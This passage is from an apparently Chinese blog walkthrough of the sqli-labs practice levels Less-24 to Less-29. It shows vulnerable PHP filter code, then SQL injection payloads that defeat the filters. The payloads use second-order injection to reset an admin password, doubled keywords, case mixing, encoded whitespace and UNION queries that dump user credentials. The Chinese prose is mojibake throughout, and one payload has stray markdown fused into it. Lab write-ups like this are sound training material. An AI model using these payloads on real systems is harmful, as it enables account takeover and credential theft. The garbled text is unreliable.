class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œç›´æ¥ä½¿ç”¨å•å¼•å·æ‹¼æ¥äº† username æ‰€ä»¥å½“ username å¯æ§çš„è¯ ï¼Œè¿™é‡Œæ˜¯å­˜åœ¨SQLæ³¨å…¥çš„ï¼Œå‡è®¾ç”¨æˆ·æ³¨å†Œçš„ username çš„å€¼ä¸ºï¼š<code>admin&#39;#</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„å®Œæ•´è¯­å¥å°±ä¸ºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment"># and password='$curr_pass'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶å°±å®Œå…¨æ”¹å˜äº†è¯­ä¹‰ï¼Œç›´æ¥å°±ä¿®æ”¹æ‰äº† admin ç”¨æˆ·çš„å¯†ç ã€‚</p><h3 id="æ­¥éª¤æ¼”ç¤º"><a href="#æ­¥éª¤æ¼”ç¤º" class="headerlink" title="æ­¥éª¤æ¼”ç¤º"></a>æ­¥éª¤æ¼”ç¤º</h3><p>å¸¸è§ä¸€ä¸ª<code>admin&#39;#</code>å¼€å¤´çš„ç”¨æˆ·åï¼Œä¸‹é¢åˆ—ä¸¾çš„å‡ ç§éƒ½å¯ä»¥ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¾ˆçµæ´»ï¼š</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;#1admin&#39;#233admin&#39;#gg...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨å†Œå®Œæˆåæ•°æ®åº“çš„è®°å½•ä¿¡æ¯å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#hacker | 111        |</span>+----+---------------+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸæ·»åŠ äº†è®°å½•ï¼Œè¿™é‡Œå•å¼•å·æ•°æ®åº“ä¸­ä¸­çœ‹æ²¡æœ‰è¢«è™½ç„¶è½¬ä¹‰äº†ï¼Œè¿™æ˜¯å› ä¸ºè½¬ä¹‰åªä¸è¿‡æ˜¯æš‚æ—¶çš„ï¼Œæœ€åå­˜å…¥åˆ°æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯æ²¡å˜çš„ã€‚</p><p>æ¥ä¸‹æ¥ç™»å½• <code>admin&#39;#hacker</code> ç”¨æˆ·ï¼Œç„¶åæ¥ä¿®æ”¹å½“å‰çš„å¯†ç ï¼š</p><p><img src="https://image.3001.net/images/20200523/15901641643476.png" alt="img"></p><p>æ­¤æ—¶æ¥æ•°æ®åº“ä¸­æŸ¥çœ‹ï¼Œå¯ä»¥å‘ç°æˆåŠŸä¿®æ”¹æ‰äº† admin ç”¨çš„å¯†ç äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>+----+---------------+------------+<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin         <span class="token operator">|</span> <span class="token number">233</span>        <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#hacker | 111        |</span>+----+---------------+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>å…³é”®ä»£ç åˆ†æï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id ç›´æ¥å•å¼•å·æ‹¼æ¥</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># ä½†æ˜¯ id è¢«å¦‚ä¸‹å‡½æ•°è¿‡æ»¤äº†</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/AND/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº† or å’Œ and å…³é”®è¯ï¼Œä½†æ˜¯è¿˜å­˜åœ¨å¾ˆå¤šæ–¹æ³•å¯ä»¥ç»•è¿‡ï¼Œä¸‹é¢å…·ä½“æ¼”ç¤ºä¸€ä¸‹ï¼š</p><h3 id="åŒå†™åµŒå¥—ç»•è¿‡"><a href="#åŒå†™åµŒå¥—ç»•è¿‡" class="headerlink" title="åŒå†™åµŒå¥—ç»•è¿‡"></a>åŒå†™åµŒå¥—ç»•è¿‡</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+password&#96; å†™æˆäº† &#96;passwoorrd&#96;ï¼Œ&#96;SEPARATOR&#96;å†™æˆ&#96;SEPARATOORR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>###ç¬¦å·æ›¿æ¢</p><pre class="line-numbers language-none"><code class="language-none">or&#96; -&gt; &#96;||and&#96; -&gt; &#96;&amp;&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>ä¸ Less-25 ç›¸æ¯”ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼æ”¹å˜ï¼Œå› ä¸ºä»£ç ä¸­æ²¡æœ‰è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå…¶ä»–åˆ©ç”¨æ–¹å¼éƒ½æ˜¯ä¸€æ ·çš„ï¼Œ è¿™é‡Œä¸å†å•°å—¦ã€‚</p><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># è¿‡æ»¤äº† or å’Œ and å¤§å°å†™</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//strip out OR (non case sensitive)</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out AND (non case sensitive)</span><span class="token comment"># è¿‡æ»¤äº† /*</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//strip out /*</span><span class="token comment"># è¿‡æ»¤äº† -- å’Œ # æ³¨é‡Š</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out --</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//Strip out #</span><span class="token comment"># è¿‡æ»¤äº†ç©ºæ ¼</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\s]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out spaces</span><span class="token comment"># è¿‡æ»¤äº†æ–œçº¿</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\\\\]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out slashes</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº† or å’Œ and å¯ä»¥é‡‡ç”¨ åŒå†™æˆ–è€… &amp;&amp; || ç»•è¿‡</p><p>è¿‡æ»¤æ³¨é‡Š å¯ä»¥ä½¿ç”¨é—­åˆç»•è¿‡</p><p>è¿‡æ»¤äº†ç©ºæ ¼ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ç¬¦å·æ¥æ›¿ä»£ï¼š</p><table><thead><tr><th align="left">ç¬¦å·</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">%09</td><td align="left">TAB é”®(æ°´å¹³)</td></tr><tr><td align="left">%0a</td><td align="left">æ–°å»ºä¸€è¡Œ</td></tr><tr><td align="left">%0c</td><td align="left">æ–°çš„ä¸€é¡µ</td></tr><tr><td align="left">%0d</td><td align="left">return åŠŸèƒ½</td></tr><tr><td align="left">%0b</td><td align="left">TAB é”®(å‚ç›´)</td></tr><tr><td align="left">%a0</td><td align="left">ç©ºæ ¼</td></tr></tbody></table><p>ç›´æ¥ä¸Š payload å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,passwoorrd,0x3c62723e))))x),3%0baandnd%0b&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>ä¸ Less-26 ç›¸æ¯”ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼æ”¹å˜äº†ï¼Œå› ä¸ºæ²¡æœ‰è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†ï¼Œç„¶åä¸å†å•°å—¦ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œæµ‹è¯•ã€‚</p><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>è¿‡æ»¤è§„åˆ™åˆå¢åŠ äº†è®¸å¤šï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># è¿‡æ»¤äº† /*</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤äº† -</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤äº† #</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤äº†ç©ºæ ¼</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤äº† select /m ä¸¥æ ¼æ¨¡å¼ ä¸å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/m'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/SELECT/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤äº† union UNION</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/UNION/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>union å’Œ select æ²¡æœ‰å¿½ç•¥å¤§å°å†™ å¯¼è‡´å†™äº†å¾ˆå¤šå†—æ‚çš„è§„åˆ™ï¼Œä½†è¿˜æ˜¯å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å¤§å°å†™æ··å†™</span>unioNunIonseLect<span class="token punctuation">..</span>.<span class="token comment"># åµŒå¥—åŒå†™</span>uunionnionsselectelectununionion<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆå¤šç§æ–¹æ¡ˆï¼Œä¸å†èµ˜è¿°ï¼Œä¸‹é¢ç›´æ¥ä¸¢ payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;100&#39;%0bununionion%0bseLect%0b1,(seLect(@x)FROM(seLect(@x:&#x3D;0x00) ,(seLect(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3%0band%0b&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>å’Œ Less-27 ç›¸æ¯”ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ï¼Œåˆå› ä¸ºæ²¡æœ‰æŠ¥é”™æ—¥å¿—çš„è¾“å‡ºï¼Œæ‰€ä»¥å°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ï¼Œåˆ©ç”¨æ–¹å¼æ¢æ±¤ä¸æ¢è¯ï¼Œè¿™é‡Œä¸åšæ¼”ç¤ºäº†ã€‚</p><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>è¿‡æ»¤è§„åˆ™å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># è¿‡æ»¤ /*</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤ - # æ³¨é‡Š</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># è¿‡æ»¤ ç©ºæ ¼ +</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">.</span><span class="token comment"># è¿‡æ»¤ union select /i å¤§å°å†™éƒ½è¿‡æ»¤</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ union å’Œ select è¿™é‡Œå¯ä»¥ä½¿ç”¨åŒå†™åµŒå¥—ç»•è¿‡ï¼Œè¿‡æ»¤äº†æ³¨é‡Šçš„è¯ å°±ä½¿ç”¨é—­åˆç»•è¿‡ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ä½¿ç”¨ Less-26 çš„ç¼–ç ç»•è¿‡ï¼ŒOKåˆ†æå®Œæˆåç›´æ¥æ”¾å®Œæ•´çš„ payload å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;100&#39;)%0bunion%a0select%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%a0and%0b(&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>æ¯” Less-27 è¿˜å°‘äº†å‡ ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œè¿™æ ·ç›´æ¥ä¸¢ payload å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39;) union%a0select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>è¿™ä¸€é¢˜å’Œæ³¨å…¥å¤©ä¹¦é‡Œé¢æè¿°çš„ç¯å¢ƒä¸å¤ªä¸€æ ·ï¼Œè¿˜æ˜¯å…·ä½“åˆ†æçœ‹ä¸‹ä»£ç å§ã€‚</p><ul><li><code>index.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id = 'x' çš„æ‹¼æ¥æ–¹å¼</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> æŸ¥è¯¢åˆ°ç»“æœ<span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»æºç æ¥çœ‹çš„è¯å’Œå‰é¢çš„è²Œä¼¼æ²¡æœ‰å•¥åŒºåˆ«ï¼Œç›´æ¥å°è¯•è”åˆæ³¨å…¥çœ‹çœ‹å§ï¼š</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">index.php?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ª index.php å¤ªç®€å•äº†ï¼Œä¸çŸ¥é“å•¥æ„æ€ï¼Œä¸‹é¢ç›´æ¥é‡ç‚¹æ¥çœ‹ login.php å§ï¼š</p><ul><li><code>login.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># æŸ¥è¯¢ query çš„å­—ç¬¦ä¸²</span><span class="token variable">$qs</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># æ¨¡æ‹Ÿ tomcat çš„æŸ¥è¯¢å‡½æ•° å¤„ç†ä¸€ä¸‹</span><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># å†æ¬¡è¿‡æ»¤æ£€æµ‹</span><span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token 